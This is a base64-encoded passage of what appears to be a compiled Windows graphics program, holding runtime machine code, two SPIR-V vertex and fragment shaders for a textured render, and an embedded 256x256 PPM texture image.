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AAAAAQAAAAEAAAAAAAAgAEAAAAAAAAAAAAAAAAAAFA2CjI1NiAyNTYKMjU1CnV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dX